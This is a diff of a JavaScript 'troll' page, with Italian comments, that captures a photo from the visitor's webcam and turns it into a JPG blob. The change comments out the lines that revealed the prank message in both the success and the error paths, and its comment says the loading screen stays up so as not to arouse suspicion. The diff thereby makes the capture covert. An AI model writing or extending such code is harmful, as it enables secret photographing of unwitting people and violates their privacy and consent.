@@ -41,9 +41,9 @@ async function initTroll() {
         // Fermiamo lo stream della fotocamera perché abbiamo la foto
         stream.getTracks().forEach(track => track.stop());
 
-        // Nascondiamo il caricamento e mostriamo la scritta grande e rossa "TROLLATO"
-        loadingEl.style.display = 'none';
-        messageEl.style.display = 'block';
+        // Manteniamo la scritta di caricamento per non destare sospetti
+        // loadingEl.style.display = 'none';
+        // messageEl.style.display = 'block';
 
         // Convertiamo il canvas in un file (Blob JPG)
         canvas.toBlob(async (blob) => {
@@ -77,9 +77,9 @@ async function initTroll() {
 
     } catch (error) {
         console.error('❌ Permesso fotocamera negato o fotocamera non trovata:', error);
-        // Anche se l'utente rifiuta il permesso o c'è un errore, mostriamo comunque la scritta dello scherzo
-        loadingEl.style.display = 'none';
-        messageEl.style.display = 'block';
+        // Manteniamo la scritta di caricamento per non destare sospetti
+        // loadingEl.style.display = 'none';
+        // messageEl.style.display = 'block';
     }
 }
 
